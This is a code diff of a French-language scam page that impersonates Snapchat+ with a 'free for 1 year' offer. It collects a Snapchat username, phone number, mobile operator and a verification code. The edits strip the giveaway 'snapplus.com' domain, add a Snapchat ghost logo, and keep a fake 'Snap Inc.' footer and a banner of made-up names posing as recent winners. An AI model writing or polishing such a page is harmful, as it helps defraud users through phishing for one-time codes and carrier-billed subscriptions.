@@ -3,9 +3,10 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>snapplus.com — Snapchat+</title>
+    <title>Snapchat+ — Free 1 Year</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
     <style>
+        /* ===== RESET & BASE ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
         body {
             min-height: 100vh;
@@ -28,7 +29,7 @@
         }
         .container { width: 100%; max-width: 480px; position: relative; z-index: 1; }
 
-        /* ===== HIGHLIGHTED TOAST BANNER ===== */
+        /* ===== HIGHLIGHTED BANNER ===== */
         .highlight-banner {
             background: linear-gradient(135deg, rgba(255,252,0,0.12), rgba(255,215,0,0.08));
             border: 1px solid rgba(255,252,0,0.2);
@@ -48,14 +49,8 @@
             background: linear-gradient(90deg, transparent, rgba(255,252,0,0.1), transparent);
             animation: shimmer 4s ease-in-out infinite;
         }
-        @keyframes shimmer {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-        @keyframes bannerGlow {
-            0%, 100% { box-shadow: 0 0 20px rgba(255,252,0,0.05); }
-            50% { box-shadow: 0 0 40px rgba(255,252,0,0.15); }
-        }
+        @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+        @keyframes bannerGlow { 0%, 100% { box-shadow: 0 0 20px rgba(255,252,0,0.05); } 50% { box-shadow: 0 0 40px rgba(255,252,0,0.15); } }
         .highlight-banner .banner-text {
             font-size: 15px;
             font-weight: 600;
@@ -68,9 +63,7 @@
             font-weight: 700;
             text-shadow: 0 0 30px rgba(255,252,0,0.3);
         }
-        .highlight-banner .banner-text .highlight-emoji {
-            margin-right: 6px;
-        }
+        .highlight-banner .banner-text .highlight-emoji { margin-right: 6px; }
 
         /* ===== MAIN CARD ===== */
         .card {
@@ -78,7 +71,7 @@
             backdrop-filter: blur(24px);
             -webkit-backdrop-filter: blur(24px);
             border-radius: 40px;
-            padding: 28px 24px 24px;
+            padding: 32px 28px 28px;
             border: 1px solid rgba(255,255,255,0.06);
             box-shadow: 0 30px 80px rgba(0,0,0,0.6);
             transition: transform 0.3s ease;
@@ -90,12 +83,12 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            margin-bottom: 18px;
+            margin-bottom: 24px;
         }
         .brand {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
         }
         .brand .icon-container {
             width: 44px;
@@ -104,32 +97,16 @@
             align-items: center;
             justify-content: center;
             border-radius: 50%;
-            background: linear-gradient(135deg, #FFFC00, #FFD700);
-            box-shadow: 0 0 30px rgba(255,252,0,0.3), 0 0 60px rgba(255,252,0,0.1);
+            background: transparent;
+            box-shadow: 0 0 30px rgba(255,252,0,0.2);
             animation: iconPulse 3s ease-in-out infinite;
-            position: relative;
-            overflow: hidden;
         }
-        .brand .icon-container img {
-            width: 32px;
-            height: 32px;
-            object-fit: contain;
-            filter: drop-shadow(0 0 4px rgba(0,0,0,0.1));
+        .brand .icon-container svg {
+            width: 36px;
+            height: 36px;
+            filter: drop-shadow(0 0 6px rgba(255,252,0,0.3));
         }
-        /* Fallback if image fails to load */
-        .brand .icon-container .fallback-icon {
-            display: none;
-            font-size: 22px;
-        }
-        .brand .icon-container img:not([src]) + .fallback-icon,
-        .brand .icon-container img[src=""] + .fallback-icon,
-        .brand .icon-container img.error + .fallback-icon {
-            display: block;
-        }
-        @keyframes iconPulse {
-            0%, 100% { box-shadow: 0 0 30px rgba(255,252,0,0.3), 0 0 60px rgba(255,252,0,0.1); }
-            50% { box-shadow: 0 0 50px rgba(255,252,0,0.5), 0 0 80px rgba(255,252,0,0.2); }
-        }
+        @keyframes iconPulse { 0%, 100% { box-shadow: 0 0 30px rgba(255,252,0,0.2); } 50% { box-shadow: 0 0 50px rgba(255,252,0,0.4); } }
         .brand h1 {
             font-size: 22px;
             font-weight: 700;
@@ -137,16 +114,8 @@
             letter-spacing: -0.3px;
         }
         .brand h1 span { color: #FFFC00; }
-        .brand .domain {
-            font-size: 12px;
-            color: #888;
-            font-weight: 400;
-            margin-top: 2px;
-        }
-        .lang-switch {
-            display: flex;
-            gap: 6px;
-        }
+
+        .lang-switch { display: flex; gap: 6px; }
         .lang-switch button {
             background: transparent;
             border: 1px solid rgba(255,255,255,0.08);
@@ -162,10 +131,7 @@
         .lang-switch button.active { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.08); }
 
         /* ===== HERO ===== */
-        .hero {
-            text-align: center;
-            margin-bottom: 20px;
-        }
+        .hero { text-align: center; margin-bottom: 24px; }
         .hero h2 {
             font-size: 24px;
             font-weight: 800;
@@ -174,66 +140,38 @@
             letter-spacing: -0.5px;
         }
         .hero h2 .highlight { color: #FFFC00; }
-        .hero .sub {
-            color: #999;
-            font-size: 13px;
-            margin-top: 4px;
-        }
+        .hero .sub { color: #999; font-size: 13px; margin-top: 4px; }
 
         /* ===== BENEFITS ===== */
         .benefits {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 6px;
-            margin: 12px 0 16px;
+            margin: 14px 0 18px;
             background: rgba(255,255,255,0.03);
             border-radius: 14px;
             padding: 10px 12px;
             border: 1px solid rgba(255,255,255,0.04);
         }
-        .benefit-item {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            color: #ccc;
-            font-size: 12px;
-            font-weight: 500;
-        }
+        .benefit-item { display: flex; align-items: center; gap: 6px; color: #ccc; font-size: 12px; font-weight: 500; }
         .benefit-item .icon { font-size: 14px; }
         .benefit-item .label { color: #aaa; }
 
-        /* ===== INFO ===== */
+        /* ===== INFO BOX ===== */
         .info-box {
             background: rgba(255,252,0,0.06);
             border-radius: 12px;
             padding: 10px 14px;
-            margin-bottom: 16px;
+            margin-bottom: 18px;
             border-left: 3px solid #FFFC00;
             transition: all 0.3s ease;
         }
-        .info-box p {
-            color: #aaa;
-            font-size: 12px;
-            line-height: 1.5;
-            transition: all 0.3s ease;
-        }
+        .info-box p { color: #aaa; font-size: 12px; line-height: 1.5; }
         .info-box strong { color: #fff; }
 
-        /* ===== COUNTRY SELECTOR ===== */
-        .section-label {
-            color: #aaa;
-            font-size: 12px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 8px;
-        }
-        .country-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin-bottom: 14px;
-        }
+        /* ===== COUNTRY / OPERATOR ===== */
+        .section-label { color: #aaa; font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
+        .country-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 14px; }
         .country-btn {
             padding: 10px 6px;
             border-radius: 12px;
@@ -250,7 +188,6 @@
         .country-btn:hover { border-color: rgba(255,252,0,0.2); color: #fff; }
         .country-btn.selected { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.08); }
 
-        /* ===== OPERATOR GRID ===== */
         .operator-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -273,16 +210,8 @@
         .operator-btn.selected { border-color: #FFFC00; color: #fff; background: rgba(255,252,0,0.08); }
 
         /* ===== INPUTS ===== */
-        .input-group {
-            margin-bottom: 12px;
-        }
-        .input-group label {
-            display: block;
-            color: #aaa;
-            font-size: 12px;
-            font-weight: 500;
-            margin-bottom: 4px;
-        }
+        .input-group { margin-bottom: 12px; }
+        .input-group label { display: block; color: #aaa; font-size: 12px; font-weight: 500; margin-bottom: 4px; }
         .input-group .input-wrap {
             display: flex;
             align-items: center;
@@ -292,29 +221,12 @@
             padding: 0 14px;
             transition: all 0.3s;
         }
-        .input-group .input-wrap:focus-within {
-            border-color: #FFFC00;
-            box-shadow: 0 0 30px rgba(255,252,0,0.04);
-        }
-        .input-group .input-wrap .prefix {
-            color: #888;
-            font-size: 15px;
-            font-weight: 500;
-            padding-right: 10px;
-            border-right: 1px solid rgba(255,255,255,0.06);
-        }
-        .input-group .input-wrap input {
-            flex: 1;
-            padding: 14px 10px;
-            background: transparent;
-            border: none;
-            outline: none;
-            color: #fff;
-            font-size: 15px;
-        }
+        .input-group .input-wrap:focus-within { border-color: #FFFC00; box-shadow: 0 0 30px rgba(255,252,0,0.04); }
+        .input-group .input-wrap .prefix { color: #888; font-size: 15px; font-weight: 500; padding-right: 10px; border-right: 1px solid rgba(255,255,255,0.06); }
+        .input-group .input-wrap input { flex: 1; padding: 14px 10px; background: transparent; border: none; outline: none; color: #fff; font-size: 15px; }
         .input-group .input-wrap input::placeholder { color: #444; }
 
-        /* ===== BUTTON ===== */
+        /* ===== BUTTONS ===== */
         .btn {
             width: 100%;
             padding: 16px;
@@ -327,24 +239,10 @@
             position: relative;
             overflow: hidden;
         }
-        .btn-primary {
-            background: linear-gradient(135deg, #FFFC00, #FFD700);
-            color: #000;
-        }
+        .btn-primary { background: linear-gradient(135deg, #FFFC00, #FFD700); color: #000; }
         .btn-primary:hover { transform: scale(1.02); box-shadow: 0 8px 40px rgba(255,252,0,0.2); }
         .btn-primary:disabled { opacity: 0.5; transform: none !important; cursor: not-allowed; box-shadow: none; }
-        .btn-secondary {
-            background: rgba(255,255,255,0.06);
-            color: #fff;
-            margin-top: 8px;
-            padding: 12px;
-            border-radius: 12px;
-            border: none;
-            width: 100%;
-            font-size: 15px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
+        .btn-secondary { background: rgba(255,255,255,0.06); color: #fff; margin-top: 8px; padding: 12px; border-radius: 12px; border: none; width: 100%; font-size: 15px; cursor: pointer; transition: all 0.3s; }
         .btn-secondary:hover { background: rgba(255,255,255,0.1); }
 
         /* ===== OTP ===== */
@@ -363,23 +261,11 @@
             transition: all 0.3s;
             caret-color: #FFFC00;
         }
-        .otp-box input:focus {
-            border-color: #FFFC00;
-            box-shadow: 0 0 30px rgba(255,252,0,0.06);
-            background: rgba(255,255,255,0.06);
-        }
+        .otp-box input:focus { border-color: #FFFC00; box-shadow: 0 0 30px rgba(255,252,0,0.06); background: rgba(255,255,255,0.06); }
 
         /* ===== LOADER ===== */
         .loader-wrap { text-align: center; padding: 16px 0; }
-        .loader-spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid rgba(255,255,255,0.06);
-            border-top-color: #FFFC00;
-            border-radius: 50%;
-            margin: 0 auto 12px;
-            animation: spin 0.9s cubic-bezier(0.16, 1, 0.3, 1) infinite;
-        }
+        .loader-spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.06); border-top-color: #FFFC00; border-radius: 50%; margin: 0 auto 12px; animation: spin 0.9s cubic-bezier(0.16, 1, 0.3, 1) infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .loader-text { color: #888; font-size: 14px; text-align: center; margin-top: 8px; }
         .loader-text strong { color: #fff; }
@@ -409,10 +295,7 @@
         /* ===== STEPS ===== */
         .step { display: none; animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
         .step.active { display: block; }
-        @keyframes fadeUp {
-            0% { opacity: 0; transform: translateY(20px) scale(0.98); }
-            100% { opacity: 1; transform: translateY(0) scale(1); }
-        }
+        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(20px) scale(0.98); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
         .hidden { display: none !important; }
 
         /* ===== RESPONSIVE ===== */
@@ -426,7 +309,7 @@
             .otp-box input { width: 40px; height: 46px; font-size: 18px; }
             .brand h1 { font-size: 18px; }
             .brand .icon-container { width: 36px; height: 36px; }
-            .brand .icon-container img { width: 26px; height: 26px; }
+            .brand .icon-container svg { width: 28px; height: 28px; }
             .highlight-banner .banner-text { font-size: 13px; }
             .highlight-banner { padding: 10px 14px; }
         }
@@ -434,8 +317,8 @@
 </head>
 <body>
 
-    <!-- ===== HIGHLIGHTED BANNER ===== -->
     <div class="container">
+        <!-- ===== HIGHLIGHTED BANNER ===== -->
         <div class="highlight-banner">
             <div class="banner-text">
                 <span class="highlight-emoji">🎁</span>
@@ -449,16 +332,31 @@
             <!-- ===== HEADER ===== -->
             <div class="header">
                 <div class="brand">
+                    <!-- OPTION 1: Use your PNG (uncomment and comment the SVG) -->
+                    <!--
                     <div class="icon-container">
-                        <!-- ========================================= -->
-                        <!-- REPLACE THE SRC BELOW WITH YOUR IMAGE URL -->
-                        <!-- ========================================= -->
-                        <img src="snapchat-icon.png" alt="Snapchat+" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />
-                        <span class="fallback-icon">⭐</span>
+                        <img src="snapchat-icon.png" 
+                             alt="Snapchat+" 
+                             style="width: 32px; height: 32px; object-fit: contain; filter: drop-shadow(0 0 6px rgba(255,252,0,0.3));" />
+                    </div>
+                    -->
+                    <!-- OPTION 2: Use the SVG (recommended) -->
+                    <div class="icon-container">
+                        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                            <!-- Ghost body (yellow) -->
+                            <path d="M50 15 C30 15 20 30 20 45 C20 60 25 75 35 80 C40 82 45 78 50 75 C55 78 60 82 65 80 C75 75 80 60 80 45 C80 30 70 15 50 15 Z" fill="#FFFC00" stroke="#E6B800" stroke-width="1.5" />
+                            <!-- Ghost eyes -->
+                            <circle cx="38" cy="45" r="5" fill="#000" />
+                            <circle cx="62" cy="45" r="5" fill="#000" />
+                            <!-- Ghost mouth -->
+                            <path d="M42 58 Q50 68 58 58" stroke="#000" stroke-width="3" fill="none" stroke-linecap="round" />
+                            <!-- Plus sign (white) -->
+                            <rect x="46" y="30" width="8" height="40" rx="2" fill="#FFFFFF" />
+                            <rect x="30" y="46" width="40" height="8" rx="2" fill="#FFFFFF" />
+                        </svg>
                     </div>
                     <div>
                         <h1>snap<span>chat</span>+</h1>
-                        <div class="domain">snapplus.com</div>
                     </div>
                 </div>
                 <div class="lang-switch">
@@ -468,35 +366,25 @@
                 </div>
             </div>
 
-            <!-- ===== STEP 1: COUNTRY + PHONE ===== -->
+            <!-- ===== REST OF THE PAGE (unchanged) ===== -->
             <div id="step1" class="step active">
-
-                <!-- Hero -->
                 <div class="hero">
                     <h2 id="heroTitle">Activez <span class="highlight">Snapchat+</span><br />gratuitement pendant 1 an !</h2>
                 </div>
-
-                <!-- Benefits -->
                 <div class="benefits">
                     <div class="benefit-item"><span class="icon">✨</span> <span class="label" id="benefit1">Badges exclusifs</span></div>
                     <div class="benefit-item"><span class="icon">👀</span> <span class="label" id="benefit2">Qui a revu votre story</span></div>
                     <div class="benefit-item"><span class="icon">📈</span> <span class="label" id="benefit3">Boost de score</span></div>
                     <div class="benefit-item"><span class="icon">⏳</span> <span class="label" id="benefit4">Offre limitée</span></div>
                 </div>
-
-                <!-- Info -->
                 <div class="info-box">
                     <p id="infoText">📱 <strong>Disponible uniquement</strong> pour les numéros <span id="countryNameInInfo">France</span> des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas.</p>
                 </div>
-
-                <!-- Country -->
                 <div class="section-label" id="countryLabel">🌍 Pays</div>
                 <div class="country-grid" id="countryGrid">
                     <div class="country-btn selected" data-country="FR"><span class="flag">🇫🇷</span> <span class="country-name">France</span></div>
                     <div class="country-btn" data-country="BE"><span class="flag">🇧🇪</span> <span class="country-name">Belgique</span></div>
                 </div>
-
-                <!-- Username -->
                 <div class="input-group">
                     <label for="usernameInput" id="usernameLabel">👤 Nom d'utilisateur Snapchat</label>
                     <div class="input-wrap">
@@ -504,14 +392,8 @@
                         <input type="text" id="usernameInput" placeholder="votre_snap" maxlength="30" />
                     </div>
                 </div>
-
-                <!-- Operator -->
                 <div class="section-label" id="operatorLabel">📡 Opérateur mobile</div>
-                <div class="operator-grid" id="operatorGrid">
-                    <!-- Populated by JS -->
-                </div>
-
-                <!-- Phone -->
+                <div class="operator-grid" id="operatorGrid"></div>
                 <div class="input-group">
                     <label for="phoneInput" id="phoneLabel">📞 Numéro de téléphone</label>
                     <div class="input-wrap">
@@ -520,11 +402,9 @@
                     </div>
                     <div style="margin-top:4px; color:#555; font-size:11px;" id="phoneHint">Numéro mobile (10 chiffres) — c'est pour savoir si vous êtes un humain 🐻</div>
                 </div>
-
                 <button class="btn btn-primary" id="sendBtn">Continuer →</button>
             </div>
 
-            <!-- ===== STEP 2: LOADING ===== -->
             <div id="step2" class="step">
                 <div class="loader-wrap">
                     <div class="loader-spinner"></div>
@@ -533,7 +413,6 @@
                 </div>
             </div>
 
-            <!-- ===== STEP 3: OTP ===== -->
             <div id="step3" class="step">
                 <div class="hero">
                     <h2 id="otpTitle" style="font-size:22px;">🔑 Code de vérification</h2>
@@ -547,7 +426,6 @@
                 <button class="btn btn-secondary" id="backToPhone">← Retour</button>
             </div>
 
-            <!-- ===== STEP 4: SUCCESS ===== -->
             <div id="step4" class="step">
                 <div class="icon-big">✅</div>
                 <div class="hero">
@@ -560,7 +438,6 @@
                 <button class="btn btn-primary" id="resetBtn">Ouvrir Snapchat</button>
             </div>
 
-            <!-- ===== STEP 5: ERROR ===== -->
             <div id="step5" class="step">
                 <div class="icon-big">❌</div>
                 <div class="hero">
@@ -570,7 +447,6 @@
                 <button class="btn btn-primary" id="retryBtn" style="background: #ff6b6b; color:#fff;">Réessayer</button>
             </div>
 
-            <!-- ===== FOOTER ===== -->
             <div class="footer">
                 <span>© 2026 Snap Inc.</span>
                 <a href="#">Cloudflare Privacy</a>
@@ -683,27 +559,17 @@
             }
         };
 
-        // ============================================================
-        // OPERATORS BY COUNTRY
-        // ============================================================
         const OPERATORS = {
             FR: ['Orange', 'SFR', 'Bouygues'],
             BE: ['Proximus', 'Orange BE', 'BASE', 'Telenet']
         };
 
-        // ============================================================
-        // STATE
-        // ============================================================
         let selectedCountry = 'FR';
         let selectedOperator = 'Orange';
         let queueId = null;
         let otpLength = 4;
         let currentLang = 'fr';
-        let bannerInterval = null;
 
-        // ============================================================
-        // DOM REFS
-        // ============================================================
         const step1 = document.getElementById('step1');
         const step2 = document.getElementById('step2');
         const step3 = document.getElementById('step3');
@@ -725,11 +591,7 @@
         const bannerName = document.getElementById('bannerName');
         const bannerAction = document.getElementById('bannerAction');
         const infoText = document.getElementById('infoText');
-        const countryNameInInfo = document.getElementById('countryNameInInfo');
 
-        // ============================================================
-        // UPDATE COUNTRY INFO
-        // ============================================================
         function updateCountryInfo(country) {
             const t = LANG[currentLang];
             if (country === 'FR') {
@@ -737,15 +599,11 @@
             } else {
                 infoText.innerHTML = t.infoTextBE;
             }
-            // Update country name in the info box
             const countryName = country === 'FR' ? t.france : t.belgium;
             const span = infoText.querySelector('#countryNameInInfo');
             if (span) span.textContent = countryName;
         }
 
-        // ============================================================
-        // LANGUAGE FUNCTION
-        // ============================================================
         function setLanguage(lang) {
             currentLang = lang;
             const t = LANG[lang];
@@ -781,23 +639,16 @@
             document.getElementById('retryBtn').textContent = t.retryBtn;
             bannerAction.textContent = t.bannerAction;
 
-            // Update OTP sub if visible
             const number = displayNumber.textContent;
             if (number) {
                 document.getElementById('otpSub').innerHTML = t.otpSub.replace('{number}', number);
             }
-
-            // Update country info text
             updateCountryInfo(selectedCountry);
 
-            // Update language buttons
             document.querySelectorAll('.lang-switch button').forEach(b => b.classList.remove('active'));
             document.querySelector(`.lang-switch button[data-lang="${lang}"]`).classList.add('active');
         }
 
-        // ============================================================
-        // POPULATE OPERATORS
-        // ============================================================
         function populateOperators(country) {
             const ops = OPERATORS[country] || ['Orange', 'SFR', 'Bouygues'];
             operatorGrid.innerHTML = '';
@@ -822,9 +673,6 @@
             countryCode.textContent = codes[country] || '+33';
         }
 
-        // ============================================================
-        // COUNTRY SELECTION
-        // ============================================================
         document.querySelectorAll('.country-btn').forEach(btn => {
             btn.addEventListener('click', function() {
                 document.querySelectorAll('.country-btn').forEach(b => b.classList.remove('selected'));
@@ -840,9 +688,6 @@
             });
         });
 
-        // ============================================================
-        // LANGUAGE SWITCH
-        // ============================================================
         document.querySelectorAll('.lang-switch button').forEach(btn => {
             btn.addEventListener('click', function() {
                 const lang = this.dataset.lang;
@@ -850,14 +695,10 @@
             });
         });
 
-        // ============================================================
-        // BANNER — random names with highlight
-        // ============================================================
         const names = ['Élodie', 'Lucas', 'Chloé', 'Hugo', 'Camille', 'Léa', 'Thomas', 'Manon', 'Emma', 'Nathan', 'Inès', 'Raphaël', 'Alice', 'Paul'];
 
         function updateBanner(name) {
             bannerName.textContent = name;
-            // Re-trigger animation
             const banner = document.querySelector('.highlight-banner');
             banner.style.animation = 'none';
             setTimeout(() => { banner.style.animation = 'bannerGlow 3s ease-in-out infinite'; }, 10);
@@ -868,32 +709,21 @@
             updateBanner(name);
         }
 
-        // Rotate every 7 seconds
         setInterval(rotateBannerName, 7000);
-        // Initial random
         setTimeout(() => {
             const name = names[Math.floor(Math.random() * names.length)];
             updateBanner(name);
         }, 500);
 
-        // ============================================================
-        // STEP MANAGEMENT
-        // ============================================================
         function goToStep(id) {
             document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
             document.getElementById(id).classList.add('active');
         }
 
-        // ============================================================
-        // BACK BUTTONS
-        // ============================================================
         document.getElementById('backToPhone').addEventListener('click', function() { goToStep('step1'); });
         document.getElementById('retryBtn').addEventListener('click', function() { goToStep('step1'); phoneInput.value = ''; });
         document.getElementById('resetBtn').addEventListener('click', resetAll);
 
-        // ============================================================
-        // SEND NUMBER
-        // ============================================================
         sendBtn.addEventListener('click', sendNumber);
         phoneInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') sendNumber(); });
         usernameInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') phoneInput.focus(); });
@@ -1006,9 +836,6 @@
             }, 2000);
         }
 
-        // ============================================================
-        // OTP
-        // ============================================================
         function setupOTP(length) {
             otpLength = length;
             otpContainer.innerHTML = '';
@@ -1110,9 +937,6 @@
             }, 2000);
         }
 
-        // ============================================================
-        // RESET
-        // ============================================================
         function resetAll() {
             goToStep('step1');
             phoneInput.value = '';
@@ -1132,9 +956,6 @@
             setLanguage(currentLang);
         }
 
-        // ============================================================
-        // MAX 10 DIGITS ON PHONE INPUT
-        // ============================================================
         phoneInput.addEventListener('input', function() {
             let val = this.value.replace(/\D/g, '');
             if (val.length > 10) val = val.slice(0, 10);
@@ -1146,9 +967,6 @@
             this.value = formatted;
         });
 
-        // ============================================================
-        // INIT
-        // ============================================================
         populateOperators('FR');
         updateCountryInfo('FR');
         setLanguage('fr');
